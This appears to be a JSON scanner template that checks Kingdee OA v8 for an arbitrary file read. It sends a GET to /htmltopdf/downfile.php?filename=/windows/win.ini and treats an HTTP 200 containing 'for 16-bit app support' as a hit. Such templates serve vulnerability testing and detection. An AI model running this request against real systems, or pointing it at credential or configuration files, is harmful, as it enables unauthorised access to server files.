{
    "Name": "金蝶OA-v8-v8-file-read",
    "Description": "金蝶OA-v8-v8-file-read",
    "Product": "金蝶OA",
    "author": "chumeng",
    "Request":[
        {
        "Method": "GET",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/htmltopdf/downfile.php?filename=/windows/win.ini",
        "Port":"",
        "Data":"",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            {
            "Operation": "contains",
            "Key":"",
            "Value": "for 16-bit app support"
            },
            {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
             }
        ]
        },
        "Next_decide":""
        }
            
    ]}